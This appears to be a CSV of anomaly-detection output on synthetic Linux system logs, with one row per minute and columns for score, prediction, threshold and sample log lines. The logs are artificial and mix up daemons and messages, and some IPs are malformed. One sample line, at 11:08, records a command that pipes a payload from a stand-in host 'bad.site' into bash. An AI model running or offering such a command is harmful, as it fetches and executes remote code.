bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 11:00:00,0.9992511839785768,1,1,0.8224995273096307,3,56,smartd: Rotating log files. || systemd-timesyncd: Synced RTC time from system clock. || ntpd: kernel: Out of memory: Kill process 50133 (python3) score 987 or sacrifice child || rsyslogd: Started CUPS Scheduler. || unattended-upgrades: Listening on L
2026-07-01 11:01:00,0.9503127582017447,1,1,0.8224995273096307,3,61,sshd: Started Session c183 of user root. || named: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.30653 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || sudo: Started Session c17 of user root. || rsyslogd: Accepted publickey for user from 10.0.0.122 port 22
2026-07-01 11:02:00,0.9260838664615505,1,1,0.8224995273096307,3,59,telnetd: Listening on LVM2 poll daemon socket. || dockerd: Rotating log files. || docker: Listening on LVM2 poll daemon socket. || rsyslogd: Started Cleanup of Temporary Directories. || redis-server: Rotating log files. || chronyd: Accepted publickey
2026-07-01 11:03:00,0.9518146373724432,1,1,0.8224995273096307,3,67,telnetd: Finished Daily apt download activities. || cups: Started Session c42 of user root. || systemd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || smartd: Started Cleanup of Temporary Directori
2026-07-01 11:04:00,0.9852806389928225,1,1,0.8224995273096307,3,58,logrotate: Started Session c97 of user root. || sudo: Listening on LVM2 poll daemon socket. || telnetd: Synced RTC time from system clock. || docker: Started Session c185 of user root. || systemd-timesyncd: Synced RTC time from system clock. || logro
2026-07-01 11:05:00,0.9978956567548894,1,1,0.8224995273096307,3,61,unattended-upgrades: Rotating log files. || ftpd: Rotating log files. || chronyd: Started Cleanup of Temporary Directories. || ufw: Synced RTC time from system clock. || smartd: Synced RTC time from system clock. || rsyslogd: Finished Daily apt downl
2026-07-01 11:06:00,0.9999844156549126,1,1,0.8224995273096307,3,63,sudo: Accepted publickey for user from 10.0.0.217 port 22 ssh2. || CRON: Finished Daily apt download activities. || rsyslogd: Started CUPS Scheduler. || unattended-upgrades: Synced RTC time from system clock. || gpm: Listening on LVM2 poll daemon soc
2026-07-01 11:07:00,0.999991439426021,1,1,0.8224995273096307,3,62,ftpd: Synced RTC time from system clock. || NetworkManager: Accepted publickey for user from 10.0.0.247 port 22 ssh2. || systemd-timesyncd: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || smartd: Finished Daily apt download activities. |
2026-07-01 11:08:00,0.9997476741309587,1,1,0.8224995273096307,3,56,dockerd: Started CUPS Scheduler. || sshd: Listening on LVM2 poll daemon socket. || redis-server: Listening on LVM2 poll daemon socket. || rsyslogd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || CRON: Started CUPS Scheduler. || logrotate
2026-07-01 11:09:00,0.9999425469039831,1,1,0.8224995273096307,3,60,gpm: Finished Daily apt download activities. || redis-server: Finished Daily apt download activities. || smartd: Started Cleanup of Temporary Directories. || telnetd: Listening on LVM2 poll daemon socket. || logrotate: EXT4-fs error (device sda1): ex
2026-07-01 11:10:00,0.999967654052506,1,1,0.8224995273096307,3,57,gpm: Started CUPS Scheduler. || ntpd: Started Session c77 of user root. || telnetd: Listening on LVM2 poll daemon socket. || named: Listening on LVM2 poll daemon socket. || named: Listening on LVM2 poll daemon socket. || logrotate: Started Session c1
2026-07-01 11:11:00,0.9996587680625922,1,1,0.8224995273096307,3,61,systemd: Accepted publickey for user from 10.0.0.65 port 22 ssh2. || NetworkManager: Accepted publickey for user from 10.0.0.134 port 22 ssh2. || CRON: Started Session c248 of user root. || docker: Started CUPS Scheduler. || chronyd: Started Cleanup 
2026-07-01 11:12:00,0.9989077558645634,1,1,0.8224995273096307,3,60,CRON: Listening on LVM2 poll daemon socket. || kernel: Synced RTC time from system clock. || logrotate: Synced RTC time from system clock. || sshd: Finished Daily apt download activities. || telnetd: Listening on LVM2 poll daemon socket. || gpm: bash
2026-07-01 11:13:00,0.9998254052239703,1,1,0.8224995273096307,3,60,named: Started Session c60 of user root. || smartd: Listening on LVM2 poll daemon socket. || named: Accepted publickey for user from 10.0.0.212 port 22 ssh2. || systemd-timesyncd: Accepted publickey for user from 10.0.0.145 port 22 ssh2. || sshd: Lis
2026-07-01 11:14:00,0.9894698110995161,1,1,0.8224995273096307,3,60,systemd-timesyncd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.5935 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || dockerd: Started CUPS Scheduler. || smartd: Rotating log files. || ftpd: Rotating log files. || NetworkManager: Started Cleanup of Tempor
2026-07-01 11:15:00,0.9617513108338072,1,1,0.8224995273096307,3,63,cups: Accepted publickey for user from 10.0.0.138 port 22 ssh2. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. || docker: Synced RTC time from system clock. || ftpd: Started Cleanup of Temporary Directories. 
2026-07-01 11:16:00,0.997255793660724,1,1,0.8224995273096307,3,61,ntpd: Started CUPS Scheduler. || gpm: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.50683 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || xinetd: Started Cleanup of Temporary Directories. || docker: Rotating log files. || NetworkManager: Started CUPS Sche
2026-07-01 11:17:00,0.9841520985328768,1,1,0.8224995273096307,3,58,logrotate: Rotating log files. || rsyslogd: Finished Daily apt download activities. || docker: Listening on LVM2 poll daemon socket. || ntpd: Started Session c183 of user root. || sshd: Accepted publickey for user from 10.0.0.205 port 22 ssh2. || chr
2026-07-01 11:18:00,0.9953269702377194,1,1,0.8224995273096307,3,55,ufw: Started Cleanup of Temporary Directories. || cups: Started CUPS Scheduler. || CRON: Listening on LVM2 poll daemon socket. || ufw: Finished Daily apt download activities. || docker: Started CUPS Scheduler. || sudo: Started Session c102 of user ro
2026-07-01 11:19:00,0.9993091736480905,1,1,0.8224995273096307,3,58,NetworkManager: Started CUPS Scheduler. || chronyd: Started Cleanup of Temporary Directories. || unattended-upgrades: Synced RTC time from system clock. || dockerd: Started CUPS Scheduler. || ftpd: Failed password for invalid user test from 192.168.1
2026-07-01 11:20:00,0.9999827044755011,1,1,0.8224995273096307,3,64,sshd: Rotating log files. || smartd: Listening on LVM2 poll daemon socket. || NetworkManager: Accepted publickey for user from 10.0.0.189 port 22 ssh2. || sshd: Listening on LVM2 poll daemon socket. || NetworkManager: Rotating log files. || rsyslogd:
2026-07-01 11:21:00,0.9999971826020225,1,1,0.8224995273096307,3,60,unix_chkpwd: Started CUPS Scheduler. || kernel: Synced RTC time from system clock. || unattended-upgrades: Finished Daily apt download activities. || unattended-upgrades: Started CUPS Scheduler. || unix_chkpwd: Accepted publickey for user from 10.0.0
2026-07-01 11:22:00,0.9999957250620215,1,1,0.8224995273096307,3,61,kernel: Finished Daily apt download activities. || telnetd: Started Session c242 of user root. || named: Started Cleanup of Temporary Directories. || sudo: Accepted publickey for user from 10.0.0.108 port 22 ssh2. || logrotate: Started Cleanup of Tem
2026-07-01 11:23:00,0.9999986558228129,1,1,0.8224995273096307,3,61,ntpd: Listening on LVM2 poll daemon socket. || cups: Started Cleanup of Temporary Directories. || CRON: Accepted publickey for user from 10.0.0.117 port 22 ssh2. || cups: Started CUPS Scheduler. || docker: Listening on LVM2 poll daemon socket. || doc
2026-07-01 11:24:00,0.9999996070394565,1,1,0.8224995273096307,3,60,chronyd: Accepted publickey for user from 10.0.0.128 port 22 ssh2. || ntpd: Rotating log files. || named: Synced RTC time from system clock. || redis-server: Listening on LVM2 poll daemon socket. || logrotate: Started CUPS Scheduler. || CRON: Listeni
2026-07-01 11:25:00,0.9999997149807911,1,1,0.8224995273096307,3,62,rsyslogd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started CUPS Scheduler. || gpm: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || logrotate: Started CUPS Scheduler. || unattended-upgrades: Started Cleanup of Temporary
2026-07-01 11:26:00,0.9999999579814456,1,1,0.8224995273096307,3,61,unix_chkpwd: Synced RTC time from system clock. || gpm: Finished Daily apt download activities. || unix_chkpwd: Started CUPS Scheduler. || sudo: Started CUPS Scheduler. || unix_chkpwd: Rotating log files. || gpm: Finished Daily apt download activitie
2026-07-01 11:27:00,0.9999396842599635,1,1,0.8224995273096307,3,57,named: Synced RTC time from system clock. || sshd: Rotating log files. || ntpd: Rotating log files. || xinetd: Started Cleanup of Temporary Directories. || chronyd: Started CUPS Scheduler. || systemd-timesyncd: Accepted publickey for user from 10.0.0
2026-07-01 11:28:00,0.9990272848515606,1,1,0.8224995273096307,3,59,ftpd: Started CUPS Scheduler. || systemd-timesyncd: Finished Daily apt download activities. || sudo: Started Session c137 of user root. || named: Started CUPS Scheduler. || systemd: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. |
2026-07-01 11:29:00,0.9999278564751897,1,1,0.8224995273096307,3,60,sshd: Rotating log files. || redis-server: Accepted publickey for user from 10.0.0.14 port 22 ssh2. || cups: Finished Daily apt download activities. || dockerd: Started Session c61 of user root. || systemd: Started CUPS Scheduler. || cups: Started Cl
2026-07-01 11:30:00,0.9998691999573531,1,1,0.8224995273096307,3,59,unix_chkpwd: Rotating log files. || NetworkManager: Started Session c7 of user root. || ntpd: Synced RTC time from system clock. || cups: Finished Daily apt download activities. || unattended-upgrades: Started Cleanup of Temporary Directories. || uni
2026-07-01 11:31:00,0.9979737118003199,1,1,0.8224995273096307,3,60,xinetd: Listening on LVM2 poll daemon socket. || kernel: Started Session c13 of user root. || sshd: Accepted publickey for user from 10.0.0.128 port 22 ssh2. || unattended-upgrades: Synced RTC time from system clock. || unattended-upgrades: Accepted 
2026-07-01 11:32:00,0.9992519208147707,1,1,0.8224995273096307,3,57,telnetd: Started Cleanup of Temporary Directories. || chronyd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.40751 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || xinetd: Synced RTC time from system clock. || logrotate: Accepted publickey for user from 10
2026-07-01 11:33:00,0.999424218145654,1,1,0.8224995273096307,3,58,redis-server: Accepted publickey for user from 10.0.0.84 port 22 ssh2. || ntpd: Synced RTC time from system clock. || ntpd: kernel: Out of memory: Kill process 36643 (python3) score 987 or sacrifice child || dockerd: Listening on LVM2 poll daemon soc
2026-07-01 11:34:00,0.9999969579778487,1,1,0.8224995273096307,3,60,unattended-upgrades: Finished Daily apt download activities. || docker: Started Session c57 of user root. || logrotate: Started Cleanup of Temporary Directories. || ntpd: Started Cleanup of Temporary Directories. || kernel: Listening on LVM2 poll dae
2026-07-01 11:35:00,0.9999967495104116,1,1,0.8224995273096307,3,56,rsyslogd: Rotating log files. || ntpd: Started Session c203 of user root. || ufw: Listening on LVM2 poll daemon socket. || unattended-upgrades: kernel: Kernel panic - not syncing: Fatal exception || CRON: Started Cleanup of Temporary Directories. || 
2026-07-01 11:36:00,0.9999999297284952,1,1,0.8224995273096307,3,62,sudo: Finished Daily apt download activities. || unix_chkpwd: Started Cleanup of Temporary Directories. || telnetd: Started Session c137 of user root. || ntpd: Finished Daily apt download activities. || ufw: Synced RTC time from system clock. || rsys
2026-07-01 11:37:00,0.9999999730281014,1,1,0.8224995273096307,3,58,NetworkManager: Synced RTC time from system clock. || sudo: Listening on LVM2 poll daemon socket. || ntpd: Listening on LVM2 poll daemon socket. || sshd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Session c241 of user root. |
2026-07-01 11:38:00,0.9999998033955417,1,1,0.8224995273096307,3,56,smartd: Rotating log files. || chronyd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || dockerd: Started Cleanup of Temporary Directories. || redis-server: Accepted publickey for user from 10.0.0.135 port 22 
2026-07-01 11:39:00,0.9999995112961592,1,1,0.8224995273096307,3,65,sshd: Listening on LVM2 poll daemon socket. || sshd: Started Session c210 of user root. || cups: Started CUPS Scheduler. || CRON: Finished Daily apt download activities. || unattended-upgrades: Accepted publickey for user from 10.0.0.74 port 22 ssh2.
2026-07-01 11:40:00,0.9999757099911332,1,1,0.8224995273096307,3,57,named: Listening on LVM2 poll daemon socket. || rsyslogd: Finished Daily apt download activities. || ufw: Started Cleanup of Temporary Directories. || dockerd: Finished Daily apt download activities. || logrotate: Listening on LVM2 poll daemon socket
2026-07-01 11:41:00,0.9999984840823034,1,1,0.8224995273096307,3,64,ufw: Synced RTC time from system clock. || named: Listening on LVM2 poll daemon socket. || gpm: Rotating log files. || systemd: Finished Daily apt download activities. || logrotate: Synced RTC time from system clock. || unix_chkpwd: Finished Daily ap
2026-07-01 11:42:00,0.9999976755483228,1,1,0.8224995273096307,3,58,rsyslogd: Accepted publickey for user from 10.0.0.178 port 22 ssh2. || ntpd: Listening on LVM2 poll daemon socket. || sudo: Started Cleanup of Temporary Directories. || systemd-timesyncd: Accepted publickey for user from 10.0.0.143 port 22 ssh2. || u
2026-07-01 11:43:00,0.9999998554361269,1,1,0.8224995273096307,3,59,NetworkManager: Started Cleanup of Temporary Directories. || gpm: Started Cleanup of Temporary Directories. || chronyd: Started Session c245 of user root. || unattended-upgrades: Rotating log files. || xinetd: Synced RTC time from system clock. || un
2026-07-01 11:44:00,0.9972117860265683,1,1,0.8224995273096307,3,59,docker: Accepted publickey for user from 10.0.0.141 port 22 ssh2. || cups: Started CUPS Scheduler. || xinetd: Started Cleanup of Temporary Directories. || NetworkManager: Listening on LVM2 poll daemon socket. || redis-server: Started Session c26 of u
2026-07-01 11:45:00,0.9737379480082005,1,1,0.8224995273096307,3,61,systemd: Started Session c205 of user root. || smartd: Started Cleanup of Temporary Directories. || xinetd: Rotating log files. || CRON: Synced RTC time from system clock. || ftpd: Listening on LVM2 poll daemon socket. || docker: Accepted publickey f
2026-07-01 11:46:00,0.9977567699503194,1,1,0.8224995273096307,3,59,named: Synced RTC time from system clock. || rsyslogd: Finished Daily apt download activities. || unattended-upgrades: kernel: Out of memory: Kill process 42947 (python3) score 987 or sacrifice child || cups: Started Session c11 of user root. || redi
2026-07-01 11:47:00,0.9999997397622742,1,1,0.8224995273096307,3,56,systemd-timesyncd: Started Cleanup of Temporary Directories. || named: Finished Daily apt download activities. || NetworkManager: Started Cleanup of Temporary Directories. || sshd: Accepted publickey for user from 10.0.0.158 port 22 ssh2. || systemd-
